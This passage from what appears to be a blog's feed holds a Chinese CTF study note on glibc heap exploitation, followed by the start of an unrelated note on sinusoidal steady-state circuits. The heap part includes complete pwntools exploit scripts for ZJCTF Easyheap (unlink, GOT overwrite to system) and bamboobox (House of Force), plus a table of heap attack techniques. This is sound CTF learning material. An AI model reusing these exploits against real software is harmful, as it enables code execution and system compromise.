src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230601222129466.png" alt="image-20230601222129466"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230619161203608.png" alt="image-20230619161203608"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230619161741499.png" alt="image-20230619161741499"></p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>10 个 fast bins，存储在 fastbinsY 中<br>1 个 unsorted bin，存储在 bin[1]<br>62 个 small bins，存储在 bin[2] 至 bin[63]<br>63 个 large bins，存储在 bin[64] 至 bin[126]</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><p>LIFO单链表(不用bk)</p><p>chunk 大小（含 chunk 头部）：0x10-0x40（64 位 0x20-0x80）</p><p>相邻 bin 存放的大小相差 0x8（0x10）B。</p><p>不取消inuse flag，故相邻不会合并</p><p>free的时候插到对应bin链表的前面，注意记录的地址为free的地址减0x10</p><p>同样的，malloc实际分配的内存大小应加上0x10</p><p>当分配一块较小的内存(mem&lt;&#x3D;64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>FIFO双向循环链表</p><p>大于fast bin时，暂存在unsorted bin</p><h3 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h3><p>FIFO双向循环链表</p><p>0x10-0x1f8(0x20-0x3f0)</p><p>相邻的空闲 chunk 会被合并</p><p>相邻 bin 存放的大小相差 0x8（0x10）B</p><h3 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h3><p>大于等于 0x200（0x400）B（实际大小）</p><p>双向循环链表，插入和删除可以发生在任意位置，相邻空闲 chunk 也会被合并</p><p>fd_nextsize,bk_nextsize</p><p>前32: 0x400 + 0x40*i</p><p>32~48: 0x1380 + 512*j</p><p>…</p><p>bin中大小不同，进行sort,大在前</p><h3 id="tcache-bins"><a href="#tcache-bins" class="headerlink" title="tcache bins"></a>tcache bins</h3><p>LIFO,max7,no prev_inuse</p><p>0x20-0x410(64in total,16byte)</p><p><code>tcache_perthread_struct</code>本身也是一个堆块，大小为<code>0x250</code>，位于堆开头的位置，包含数组<code>counts</code>存放每个<code>bin</code>中的<code>chunk</code>当前数量，以及数组<code>entries</code>存放<code>64</code>个<code>bin</code>的首地址（可以通过<strong>劫持此堆块</strong>进行攻击）。</p><h3 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h3><p>malloc时，较大的chunk会split一部分到last remainder，unsorted bin也会存</p><p>下次malloc，够大会直接切出来</p><h2 id="main-arena-header"><a href="#main-arena-header" class="headerlink" title="main arena header"></a>main arena header</h2><p>存bin,top chunk等</p><p>libc bss中</p><h2 id="marge-freed-chunk"><a href="#marge-freed-chunk" class="headerlink" title="marge freed chunk"></a>marge freed chunk</h2><h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><ul><li><p>detect next inuse bit: freed?(to avoid double freed)</p></li><li><p>last freed? &#x3D;&gt; unlink &#x3D;&gt; merge &#x3D;&gt; merge into unsorted bin</p></li><li><p>next top?</p><ul><li>next freed?<ul><li>inuse: merge into unsorted bin</li></ul></li></ul></li></ul><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>dangling pointer</p><h1 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h1><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="modern-protection"><a href="#modern-protection" class="headerlink" title="modern protection"></a>modern protection</h3><h4 id="corrupted-double-link-list"><a href="#corrupted-double-link-list" class="headerlink" title="corrupted double link list"></a>corrupted double link list</h4><p>when unlink</p><p>check if:</p><ul><li>P-&gt;bk-&gt;fd &#x3D;&#x3D; P</li><li>P-&gt;fd-&gt;bk &#x3D;&#x3D; P</li></ul><p>to satisfy:(i386)</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;&#x3D;&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;&#x3D;&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>then:</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;&#x3D;&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;&#x3D;&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230609205918850.png" alt="image-20230609205918850"></p><p>设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>需要使fakechunk的指针高于原指针0x10个字节，才能通过检测</p><p>ptr-&gt;ptr-0x18</p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230610225454294.png" alt="image-20230610225454294"></p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230610231438688.png" alt="image-20230610231438688"></p><h3 id="ZJCTF-2019-Easyheap"><a href="#ZJCTF-2019-Easyheap" class="headerlink" title="ZJCTF 2019 Easyheap"></a>ZJCTF 2019 Easyheap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port = <span class="number">26809</span></span><br><span class="line"><span class="comment">#p = process(&quot;./easyheap&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delet</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0x80</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">creat(<span class="number">0x80</span>, <span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">creat(<span class="number">0x20</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">addr = <span class="number">0x6020e0</span></span><br><span class="line">free_got = <span class="number">0x0000000000602018</span></span><br><span class="line">sys_plt = <span class="number">0x000000000400700</span></span><br><span class="line">payload = flat([<span class="number">0</span>, <span class="number">0x81</span>, addr-<span class="number">0x18</span>, addr-<span class="number">0x10</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload += flat([<span class="number">0x80</span>, <span class="number">0x90</span>])</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x90</span>, payload)</span><br><span class="line">delet(<span class="number">1</span>)</span><br><span class="line">payload = flat([free_got]).rjust(<span class="number">0x20</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(sys_plt))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delet(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#劫持atoi，在menu中输入/bin/sh效果一样</span></span><br></pre></td></tr></table></figure><h4 id="fake-chunk"><a href="#fake-chunk" class="headerlink" title="fake chunk"></a>fake chunk</h4><h1 id="Using-malloc-maleficarum"><a href="#Using-malloc-maleficarum" class="headerlink" title="Using malloc maleficarum"></a>Using malloc maleficarum</h1><h3 id="The-House-of-Spirit"><a href="#The-House-of-Spirit" class="headerlink" title="The House of Spirit"></a>The House of Spirit</h3><p>覆盖不到ret,可以盖到栈上free的指针位置</p><p><img src="/../img/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94heap.assets/image-20230608162704523.png" alt="image-20230608162704523"></p><p>overflow后rop</p><h3 id="The-House-of-Force"><a href="#The-House-of-Force" class="headerlink" title="The House of Force"></a>The House of Force</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(pt, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">pt = process(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line"><span class="comment">#pt = remote(host, port)</span></span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;32&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;80&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">debug()</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;-96&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;16&quot;</span>)</span><br><span class="line">pt.sendlineafter(<span class="string">&quot;:&quot;</span>,p64(<span class="number">0x0000000000400d49</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br></pre></td></tr></table></figure><h3 id="The-House-of-Orange"><a href="#The-House-of-Orange" class="headerlink" title="The House of Orange"></a>The House of Orange</h3><p>size&lt;&#x3D;128k(mmap)</p><p>页对齐4kb(0x1000)</p><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>针对检测key</p><ul><li>tcache填满</li><li>A进入unsorted bin，b随后，大小为tcache,合并</li><li>释放一个tcache</li><li>free B</li></ul><h3 id="Overwrite-Fastbin"><a href="#Overwrite-Fastbin" class="headerlink" title="Overwrite Fastbin"></a>Overwrite Fastbin</h3><table><thead><tr><th>攻击方法</th><th>影响范围</th><th>学习链接</th></tr></thead><tbody><tr><td>house of spirit</td><td>2.23—— 至今</td><td>堆利用系列之 house of spirit - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of einherjar</td><td>2.23—— 至今</td><td>PWN——House Of Einherjar CTF Wiki 例题详解 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of force</td><td>2.23——2.29</td><td>Top chunk 劫持：House of force 攻击 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of lore</td><td>2.23—— 至今</td><td>House of Lore - CTF Wiki (ctf-wiki.org)</td></tr><tr><td>house of orange</td><td>2.23——2.26</td><td>House of orange - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of rabbit</td><td>2.23——2.28</td><td><a href="http://p4nda.top/2018/04/18/house-of-rabbit/">http://p4nda.top/2018/04/18/house-of-rabbit/</a></td></tr><tr><td>house of roman</td><td>2.23——2.29</td><td>House of Roman - CTF Wiki (ctf-wiki.org)</td></tr><tr><td>house of storm</td><td>2.23——2.29</td><td>House of storm 原理及利用 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of corrosion</td><td>2.23—— 至今</td><td>House-of-Corrosion 一种新的堆利用技巧 - 先知社区 (aliyun.com)</td></tr><tr><td>house of husk</td><td>2.23—— 至今</td><td>house-of-husk 学习笔记 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of atum</td><td>2.26——2.30</td><td><a href="https://abf1ag.github.io/2021/06/11/house-of-atum/">https://abf1ag.github.io/2021/06/11/house-of-atum/</a></td></tr><tr><td>house of kauri</td><td>2.26——2.32</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of fun</td><td>2.23——2.30</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of mind</td><td>2.23—— 至今</td><td>how2heap&#x2F;house_of_mind_fastbin.c at master · shellphish&#x2F;how2heap (github.com)</td></tr><tr><td>house of muney</td><td>2.23—— 至今</td><td>House of Muney 分析 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of botcake</td><td>2.23—— 至今</td><td>奇安信攻防社区 - 深入理解 House of Botcake 堆利用手法 (butian.net)</td></tr><tr><td>house of rust</td><td>2.26—— 至今</td><td>c4ebt&#x2F;House-of-Rust</td></tr><tr><td>house of crust</td><td>2.26——2.37</td><td>c4ebt&#x2F;House-of-Rust</td></tr><tr><td>house of io</td><td>2.26—— 至今</td><td>Overview of GLIBC heap exploitation techniques (0x434b.dev)</td></tr><tr><td>house of banana</td><td>2.23—— 至今</td><td>house of banana - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of kiwi</td><td>2.23——2.36</td><td>House OF Kiwi - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of emma</td><td>2.23—— 至今</td><td>house of emma</td></tr><tr><td>house of pig</td><td>2.23—— 至今</td><td>house of pig 一个新的堆利用详解 - 安全客 - 安全资讯平台 (anquanke.com)</td></tr><tr><td>house of obstack</td><td>2.23—— 至今</td><td>一条新的 glibc IO_FILE 利用链：_IO_obstack_jumps 利用分析 - 跳跳糖 (tttang.com)</td></tr><tr><td>house of apple1</td><td>2.23—— 至今</td><td>House of Apple 一种新的 glibc 中 IO 攻击方法 (1) - roderick - record and learn! (roderickchan.cn)</td></tr><tr><td>house of apple2</td><td>2.23—— 至今</td><td>House of Apple 一种新的 glibc 中 IO 攻击方法 (2) - roderick - record and learn! (roderickchan.cn)</td></tr><tr><td>house of apple3</td><td>2.23—— 至今</td><td>House of Apple 一种新的 glibc 中 IO 攻击方法 (3) - roderick - record and learn! (roderickchan.cn)</td></tr></tbody></table><h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h1><h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h1><h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>0x200000</p><h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们修改了<code>p1</code>的<code>bk_nextsize</code>为<code>[target-0x20]</code>,也就导致了<code>victim-&gt;bk_nextsize = (&amp;target)-4)</code></p><p>然后执行<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>也就是<code>(&amp;target)-4)-&gt;fd_nextsize = victim</code> ,相当于<code>*target = victim</code> 就在<code>target</code>处写上了新入<code>large bin</code>的<code>p2</code>的地址</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电路稳态分析</title>
      <link href="/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90/"/>
      <url>/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="正弦稳态"><a href="#正弦稳态" class="headerlink" title="正弦稳态"></a>正弦稳态</h1><h2 id="正弦电压电流的相量表示"><a href="#正弦电压电流的相量表示" class="headerlink" title="正弦电压电流的相量表示"></a>正弦电压电流的相量表示</h2><p>$$<br>u(t)&#x3D;U_m\cos(wt+\psi)&#x3D;Re[\dot{U_m}e^{jw t}]<br>$$</p><p>$$<br>\dot{U_m}&#x3D;U_me^{j\psi}&#x3D;U_m\angle\psi<br>$$</p><p>由<strong>欧拉公式</strong><br>$$<br>\cos \theta + j\sin \theta&#x3D;e^{j\theta}<br>$$<br>有<br>$$<br>Re[\dot{U_m}e^{jw t}]&#x3D;U_m\cos[wt+\psi]<br>$$</p><p>$$<br>Im[\dot{U_m}e^{jw t}]&#x3D;U_m\sin[wt+\psi]<br>$$</p><p>$$<br>u(t)&#x3D;U_m\cos(wt+\psi)\longleftrightarrow\dot{U_m}&#x3D;U_m\angle\psi<br>$$</p><blockquote><p><strong>一一对应</strong>的关系，表示每一个正弦波都可以由一个相量表示</p></blockquote><p>微分——代数</p><p>时域——频域</p><h3 id="广义欧姆定律"><a href="#广义欧姆定律" class="headerlink" title="广义欧姆定律"></a>广义欧姆定律</h3><h4 id="capacitor"><a href="#capacitor" class="headerlink" title="capacitor"></a>capacitor</h4><p>$$<br>V_C&#x3D;Z_CI_C<br>$$</p><p>$$<br>Z_C&#x3D;\frac{1}{jwC}<br>$$</p><blockquote><p>此处$ j $的含义：欧拉公式代入$ \frac{\pi}{2} $得到$ j&#x3D;e^{j\frac{\pi}{2}} $ ，故可体现电流超前电压90°</p></blockquote><h4 id="inductor"><a href="#inductor" class="headerlink" title="inductor"></a>inductor</h4><p>$$<br>V_I&#x3D;Z_II_I<br>$$</p><p>$$<br>Z_I&#x3D;jwL<br>$$</p><h4 id="resistor"><a href="#resistor" class="headerlink" title="resistor"></a>resistor</h4><p>$$<br>u\space know<br>$$</p><h3 id="Tips-复数运算"><a href="#Tips-复数运算" class="headerlink" title="Tips.复数运算"></a>Tips.复数运算</h3><p><strong>乘法</strong>：模相乘，角相加</p><p><strong>除法</strong>：模相除，角相减</p><h3 id="传递函数"><a href="#传递函数" class="headerlink" title="传递函数"></a>传递函数</h3><p>系统函数，网络输出复幅值与输入复幅值的比值<br>$$<br>H(jw)&#x3D;\frac{\dot{U}_2}{\dot{U}_1}&#x3D;|H(jw)|\angle \theta(w)<br>$$</p><p>其中<br>$$<br>|H(jw)|&#x3D;\frac{U_2}{U_1}<br>$$</p><p>$$<br>\theta(w)&#x3D;\psi_2-\psi_1<br>$$</p><h3 id="频率响应"><a href="#频率响应" class="headerlink" title="频率响应"></a>频率响应</h3><p>幅值和相位作为频率的函数的图形</p><p>幅频响应 + 相频响应 &#x3D; 波特图</p><p><del>（考试画大致幅频图）</del></p><h3 id="e-g-RL电路"><a href="#e-g-RL电路" class="headerlink" title="e.g.RL电路"></a>e.g.RL电路</h3><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521230513617.png" alt="image-20230521230513617"><br>$$<br>V_o&#x3D;\frac{R}{R+Ls}V_i<br>$$</p><p>$$<br>H(jw)&#x3D;\frac{V_o}{V_i}&#x3D;\frac{R}{R+sL}<br>$$</p><p>$$<br>when\space W_0&#x3D;\frac{R}{L}&#x3D;\frac{1}{\tau},H&#x3D;\frac{1}{\sqrt{2}}<br>$$</p><p>$$<br>\lg H&#x3D;\lg\frac{w_0}{\sqrt{w_0^2+w^2}}<br>$$</p><p>$$<br>when\space w\gg w_0,20\lg H&#x3D;-20\lg\frac{W}{W_0}<br>$$</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521231014421.png" alt="image-20230521231014421"></p><p><strong>波特图：</strong>$20\lg|H(jw)|$和$\theta(w)$相对于对数频率坐标的特性曲线。纵坐标用dB作为单位</p><p>另：</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232047380.png" alt="image-20230521232047380"></p><h2 id="一阶RC-RL电路频率响应近似折线图"><a href="#一阶RC-RL电路频率响应近似折线图" class="headerlink" title="一阶RC&#x2F;RL电路频率响应近似折线图"></a>一阶RC&#x2F;RL电路频率响应近似折线图</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232656917.png" alt="image-20230521232656917"></p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521232444210.png" alt="image-20230521232444210"></p><p>转折频率$w&#x3D;\frac{1}{RC}$低频渐近线高频渐近线转折频率处相移$45°$</p><h3 id="滤波器"><a href="#滤波器" class="headerlink" title="滤波器"></a>滤波器</h3><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192346957.png" alt="image-20230521192346957"></p><p><strong>n阶滤波器：</strong>$w$每上升10倍，下降20dB的n倍</p><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230522130629436.png" alt="image-20230522130629436"></p><h2 id="放大器级间解耦（待）"><a href="#放大器级间解耦（待）" class="headerlink" title="放大器级间解耦（待）"></a>放大器级间解耦（待）</h2><p><img src="/../img/%E7%94%B5%E8%B7%AF%E7%A8%B3%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192352972.png" alt="image-20230521192352972"></p><h2 id="补偿电路（待）"><a href="#补偿电路（待）" class="headerlink" title="补偿电路（待）"></a>补偿电路（待）</h2><h2 id="阻抗中的功率与能量"><a href="#阻抗中的功率与能量" class="headerlink" title="阻抗中的功率与能量"></a>阻抗中的功率与能量</h2><h1 id="谐振电路"><a href="#谐振电路" class="headerlink" title="谐振电路"></a>谐振电路</h1><h2 id="RLC串联谐振电路"><a href="#RLC串联谐振电路" class="headerlink" title="RLC串联谐振电路"></a>RLC串联谐振电路</h2><p>$$<br>Z(jw)&#x3D;\frac{\dot{U}}{\dot{I}}&#x3D;R+j(wL-\frac{1}{wC})&#x3D;|Z(jw)|\angle\theta(w)<br>$$</p><h3 id="谐振条件"><a href="#谐振条件" class="headerlink" title="谐振条件"></a>谐振条件</h3><p>$$<br>w&#x3D;w_0&#x3D;\frac{1}{\sqrt{LC}}<br>$$</p><p>$w_0$称为电路<strong>固有谐振角频率</strong><br>$$<br>f&#x3D;f_0&#x3D;\frac{1}{2\pi\sqrt{LC}}<br>$$<br>RLC串联电路在谐振时感抗和容抗量值上相等，值为谐振电路的<strong>特性阻抗</strong><br>$$<br>\rho &#x3D;w_0L&#x3D;\frac{1}{w_0C}&#x3D;\sqrt{\frac{L}{C}}<br>$$</p><h3 id="谐振时电压电流"><a href="#谐振时电压电流" class="headerlink" 